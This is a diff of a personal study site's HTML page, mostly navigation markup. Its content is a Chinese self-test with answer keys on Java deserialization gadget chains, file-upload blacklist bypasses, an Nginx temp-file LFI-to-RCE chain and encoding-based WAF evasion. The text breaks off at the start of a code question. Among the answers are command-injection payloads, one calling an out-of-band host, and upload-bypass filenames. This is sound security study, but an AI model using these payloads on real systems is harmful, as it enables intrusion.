+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎉 成就时刻
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/reflections/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔄 复盘反思
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔄 复盘反思
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/reflections/%E7%A0%B4%E9%A2%98%E4%B9%8B%E4%BD%99-%E4%BA%A6%E7%A0%B4%E5%BF%83%E9%9A%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第一次ctf赛后复盘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../updates/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔔 动态推送
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔔 动态推送
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📦 全部动态
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔋 精神食粮
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔋 精神食粮
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/images/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖼️ 照片
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🖼️ 照片
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/music/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎵 音乐
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎵 音乐
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../spiritual/sentences/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💬 句子
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💬 句子
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../about/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📄 关于本站
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📄 关于本站
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/why/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    为什么建这个站
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../role-panel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎮 角色档案
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 自测打分表
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#420" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、选择题（每题4分，共20分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="一、选择题（每题4分，共20分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第3题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第4题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第5题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#840" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、简答题（每题8分，共40分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、简答题（每题8分，共40分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第3题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第4题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第5题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1530" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、代码/构造题（每题15分，共30分）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、代码/构造题（每题15分，共30分）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第1题（命令注入 + 编码绕过）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2cc6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第2题（CC6 链构造）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、综合分析题（10分）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、附加题（挑战，10分）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#my-answer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        my answer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="my answer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        选择题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        简答题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        代码构造题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        综合分析题
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附加题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="2">本周学习检测题（第 2 周）<a class="headerlink" href="#2" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>本周核心</strong>：Java反序列化 Chains · 命令注入 · 文件上传 · 编码绕过<br />
+<strong>本周内容</strong>：CC1/3/5/6/7链、Gadget库对比、Hdphp(Nginx临时文件LFI)、EzPing(编码差异命令注入)、命令注入、文件上传</p>
+</blockquote>
+<p><link rel="stylesheet" href="/asserts/css/test-style.css"></p>
+<script src="/asserts/js/test-script.js" defer></script>
+
+<hr />
+<h2 id="_1">📊 自测打分表<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="test-card">
+  <div class="test-score"><span>📊 基础分</span><span id="baseScore">87</span><span> / 90</span></div>
+  <div class="test-score"><span>⭐ 含附加题</span><span id="totalScore">93</span><span> / 100</span></div>
+  <div class="test-score"><span>🏆 评级</span><span id="rating">—</span></div>
+  <button class="test-reset" id="resetBtn">🔄 重置</button>
+</div>
+
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">题号</th>
+<th style="text-align: center;">题型</th>
+<th style="text-align: center;">分值</th>
+<th style="text-align: center;">得分</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">一.1</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="4"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.2</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="4"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.3</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="4"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.4</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="4"></td>
+</tr>
+<tr>
+<td style="text-align: center;">一.5</td>
+<td style="text-align: center;">选择题</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;"><input class="test-input" data-max="4" value="4"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.1</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="8"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.2</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="8"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.3</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="8"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.4</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="8"></td>
+</tr>
+<tr>
+<td style="text-align: center;">二.5</td>
+<td style="text-align: center;">简答题</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;"><input class="test-input" data-max="8" value="8"></td>
+</tr>
+<tr>
+<td style="text-align: center;">三.1</td>
+<td style="text-align: center;">代码构造题</td>
+<td style="text-align: center;">15</td>
+<td style="text-align: center;"><input class="test-input" data-max="15" value="15"></td>
+</tr>
+<tr>
+<td style="text-align: center;">三.2</td>
+<td style="text-align: center;">代码构造题</td>
+<td style="text-align: center;">15</td>
+<td style="text-align: center;"><input class="test-input" data-max="15" value="15"></td>
+</tr>
+<tr>
+<td style="text-align: center;">四</td>
+<td style="text-align: center;">综合分析题</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;"><input class="test-input" data-max="10" value="7"></td>
+</tr>
+<tr>
+<td style="text-align: center;">五</td>
+<td style="text-align: center;">附加题</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;"><input class="test-input" data-max="10" data-bonus="true" value="5"></td>
+</tr>
+</tbody>
+</table>
+<div class="test-summary">
+  <h4>📝 自测简记</h4>
+  <textarea id="testNotes" rows="2" placeholder="记录丢分题号、需要复盘的知识点【四.1,四.4,五.2】">四.1,四.4,五.2</textarea>
+</div>
+
+<hr />
+<h2 id="420">一、选择题（每题4分，共20分）<a class="headerlink" href="#420" title="Permanent link">&para;</a></h2>
+<h3 id="1">第1题<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<p>关于 CC6 链和 CC1 链的区别，下列说法正确的是？</p>
+<p>A. CC6 链使用了动态代理，CC1 没有<br />
+B. CC6 链依赖 JDK 版本 ≤ 8u71，CC1 无此限制<br />
+C. CC6 链通过 HashMap.readObject() → TiedMapEntry.hashCode() 触发，不依赖动态代理<br />
+D. CC6 链不能执行任意命令，只能做探测  </p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+
+**答案：C**
+
+**解析：**
+
+
+- A ❌ 相反，CC1 用了动态代理（AnnotationInvocationHandler + 代理），CC6 没有。
+- B ❌ CC1 有 JDK ≤ 8u71 限制，CC6 无此限制。
+- C ✅ 正确。CC6 通过 HashMap 反序列化时计算 key.hashCode() 触发 TiedMapEntry.hashCode() → LazyMap.get()。
+- D ❌ CC6 同样通过 ChainedTransformer + InvokerTransformer 执行任意命令。
+
+
+</details>
+
+<hr />
+<h3 id="2_1">第2题<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h3>
+<p>在文件上传漏洞中，关于条件竞争（Race Condition）的利用，下列说法正确的是？</p>
+<p>A. 条件竞争只能用于绕过文件类型检查，不能用于绕过内容验证<br />
+B. 条件竞争利用的是“文件上传后 → 验证 → 删除”之间的时间窗口<br />
+C. 条件竞争只能通过多线程上传同一个文件来实现<br />
+D. 使用随机化临时文件名可以完全防御条件竞争攻击  </p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**答案：B**
+
+**解析：**
+
+- A ❌ 条件竞争同样可用于绕过内容验证（如杀毒软件扫描前执行）。
+- B ✅ 核心原理：在验证通过前文件已存在于服务器上，攻击者在删除前访问并执行。
+- C ❌ 通常是一个线程不断上传恶意文件，另一个线程不断访问该文件。
+- D ❌ 如果文件名可预测（如 uniqid() 弱随机）或可爆破，仍有风险。
+
+</details>
+
+<hr />
+<h3 id="3">第3题<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<p>在 Hdphp 题目中，使用 <code>/proc/self/fd/a/../3</code> 代替 <code>/proc/self/fd/3</code> 的原因是？</p>
+<p>A. 前者路径更短，更容易被 include<br />
+B. 前者可以绕过 realpath() 对 (deleted) 后缀的检查<br />
+C. 前者可以绕过正则表达式中的 <code>(proc|dev|bin|usr|var).{15,}</code> 限制<br />
+D. 前者可以触发 Nginx 重新生成临时文件  </p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**答案：B**
+
+**解析：**
+
+- A ❌ 路径更长，不是优势。
+- B ✅ 核心：PHP 的 realpath() 会解析出 `/proc/self/fd/3` 指向的 (deleted) 路径并报错；`/proc/self/fd/a/../3` 让 PHP 无法识别为软链接，直接交给内核解析，内核会正确打开文件描述符。
+- C ❌ 正则限制的是路径中的 `/proc` 等关键词，本题正则限制的是后续长度 ≥15 个字符，`/proc/self/fd/` 路径本身不触发。
+- D ❌ 不会触发重新生成。
+
+</details>
+
+<hr />
+<h3 id="4">第4题<a class="headerlink" href="#4" title="Permanent link">&para;</a></h3>
+<p>关于 CC3 链与 CC1/5/6/7 链的本质区别，下列说法正确的是？</p>
+<p>A. CC3 链使用了 TemplatesImpl 加载恶意字节码，不依赖 Runtime.exec()<br />
+B. CC3 链只能在高版本 JDK 上使用<br />
+C. CC3 链的命令执行方式仍然是 InvokerTransformer 调用 Runtime.exec()<br />
+D. CC3 链不需要 ChainedTransformer  </p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**答案：A**
+
+**解析：**
+
+- A ✅ CC3 通过 TrAXFilter → TemplatesImpl.newTransformer() 加载恶意字节码，绕过了对 Runtime.exec() 的直接依赖。
+- B ❌ CC3 反而依赖 JDK 中的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，JDK 8 默认存在。
+- C ❌ 不是，CC3 最终执行的是字节码中的静态代码块或构造函数。
+- D ❌ CC3 仍然使用 ChainedTransformer 串联 ConstantTransformer + InstantiateTransformer。
+
+</details>
+
+<hr />
+<h3 id="5">第5题<a class="headerlink" href="#5" title="Permanent link">&para;</a></h3>
+<p>在 EzPing 题目中，绕过 WAF 的核心技术是？</p>
+<p>A. 使用 %0a 换行符绕过命令分隔符过滤<br />
+B. 使用 &amp; 和 | 的组合绕过黑名单<br />
+C. 利用 Content-Type: application/json; charset=cp037 让 WAF 和业务代码使用不同编码解析同一份数据<br />
+D. 使用 base64 编码绕过关键词检测  </p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**答案：C**
+
+**解析：**
+
+- A ❌ 换行符绕过是常见手法，但不是本题核心。
+- B ❌ 命令分隔符已被过滤。
+- C ✅ WAF 检查原始字节流（request.get_data()），业务代码按 charset 参数解码。攻击者用 cp037 编码发送 `cat /flag`，WAF 看不到 `cat` 的 ASCII 字节，业务代码解码后正常执行。
+- D ❌ base64 绕过需要管道配合 `| base64 -d | bash`，但 `|` 和 `bash` 都被过滤。
+
+</details>
+
+<hr />
+<h2 id="840">二、简答题（每题8分，共40分）<a class="headerlink" href="#840" title="Permanent link">&para;</a></h2>
+<h3 id="1_1">第1题<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h3>
+<p>请分别说明 CC1、CC5、CC6、CC7 的入口点和触发方法（如何从 readObject 走到 LazyMap.get()）。</p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+| 链 | 入口点 | 触发路径 |
+|----|--------|----------|
+| CC1 | AnnotationInvocationHandler.readObject() | memberValues.entrySet() → 动态代理 → invoke() → memberValues.get() → LazyMap.get() |
+| CC5 | BadAttributeValueExpException.readObject() | valObj.toString() → TiedMapEntry.toString() → getValue() → LazyMap.get() |
+| CC6 | HashMap.readObject() | putForCreate() → hash(key) → key.hashCode() → TiedMapEntry.hashCode() → getValue() → LazyMap.get() |
+| CC7 | Hashtable.readObject() | reconstitutionPut() → equals() → AbstractMap.equals() → LazyMap.get() |
+
+</details>
+
+<hr />
+<h3 id="2_2">第2题<a class="headerlink" href="#2_2" title="Permanent link">&para;</a></h3>
+<p>在文件上传漏洞中，列出至少 3 种绕过黑名单扩展名的方法，并分别说明原理。</p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+| 绕过方法 | 原理 | 示例 |
+|----------|------|------|
+| 大小写绕过 | 验证区分大小写，但服务器不区分 | `.pHp` |
+| 双扩展名 | 验证只看最后一个扩展名，服务器从左匹配 | `.php.jpg` |
+| 末尾添加字符 | Windows 自动去除末尾的 `.` 或空格 | `.php.` |
+| URL 编码/双重编码 | 验证不解码，服务器解码 | `%2Ephp` / `%252Ephp` |
+| 空字节截断 | C 语言字符串终止符，PHP 5.3 之前有效 | `.php%00.jpg` |
+| 覆盖 .htaccess | 让任意扩展名被当作 PHP 执行 | `.htaccess` + `shell.jpg` |
+
+> 答出任意 3 种即可。
+
+</details>
+
+<hr />
+<h3 id="3_1">第3题<a class="headerlink" href="#3_1" title="Permanent link">&para;</a></h3>
+<p>简述 CC3 链与 CC1 链在命令执行方式上的核心区别。为什么 CC3 在某些场景下更优？</p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**核心区别：**
+
+- **CC1**：通过 InvokerTransformer 反射调用 Runtime.exec() 执行系统命令。
+- **CC3**：通过 InstantiateTransformer 实例化 TrAXFilter，触发 TemplatesImpl.newTransformer() 加载恶意字节码，在字节码的静态代码块或构造函数中执行命令。
+
+**CC3 优势：**
+
+- 不依赖 Runtime.exec()，可绕过对 Runtime 类的限制。
+- 字节码中可以执行任意 Java 代码，比 exec() 更灵活（如写文件、反弹 Shell）。
+- 在某些禁用 Runtime.exec() 但允许类加载的环境中仍然可用。
+
+</details>
+
+<hr />
+<h3 id="4_1">第4题<a class="headerlink" href="#4_1" title="Permanent link">&para;</a></h3>
+<p>在命令注入中，什么是盲注？请写出两种检测盲命令注入的方法，并分别举例。</p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**盲命令注入**：应用程序执行了系统命令，但命令的输出不会返回到 HTTP 响应中。
+
+**两种检测方法：**
+
+| 方法 | 原理 | 示例 |
+|------|------|------|
+| 时间延迟 | 通过命令执行耗时判断是否执行 | `|| ping -c 10 127.0.0.1` \|\| |
+| 带外（OAST） | 触发 DNS/HTTP 请求到攻击者服务器 | `|| nslookup xxx.oastify.com` \|\| |
+| 输出重定向 | 将命令输出重定向到 Web 可访问目录 | `|| whoami > /var/www/static/whoami.txt` \|\| |
+
+> 答出任意 2 种即可。
+
+</details>
+
+<hr />
+<h3 id="5_1">第5题<a class="headerlink" href="#5_1" title="Permanent link">&para;</a></h3>
+<p>在 Hdphp 题目中，Nginx 的临时文件机制是如何被利用的？请写出完整的利用链路。</p>
+<details>
+  <summary><strong>📖 查看答案</strong></summary>
+
+**Nginx 临时文件机制：**
+
+- 当 POST 请求体大小超过 `client_body_buffer_size`（默认 8KB/16KB）时，Nginx 将请求体写入磁盘临时文件。
+- 临时文件路径模式：`/var/lib/nginx/temp/client_body/xxxxxx`
+- 临时文件在整个请求处理期间存在，请求结束后被删除。
+
+**利用链路：**
+攻击者构造一个大 POST 请求（> 16KB），请求体中包含恶意 PHP 代码
+↓
+
+Nginx 将请求体写入临时文件（如 /var/lib/nginx/.../0000000001）
+↓
+
+Nginx 通过 FastCGI 将请求转发给 PHP-FPM（请求还在处理中，临时文件未删除）
+↓
+
+攻击者通过 LFI 包含 /proc/self/fd/a/../3（指向临时文件的文件描述符）
+↓
+
+PHP 执行临时文件中的恶意代码 → RCE
+
+text
+
+**关键绕过：**
+
+使用 `/proc/self/fd/a/../3` 而非 `/proc/self/fd/3` 绕过 realpath() 对 `(deleted)` 后缀的检查。
+
+</details>
+
+<hr />
+<h2 id="1530">三、代码/构造题（每题15分，共30分）<a class="headerlink" href="#1530" title="Permanent link">&para;</a></h2>
+<h3 id="1_2">第1题（命令注入 + 编码绕过）<a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h3>
+<p>阅读以下代码，回答问题：</p>
+<p><div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># WAF 中间件</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">waf_middleware</span><span class="p">():</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>    <span class="n">raw_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>
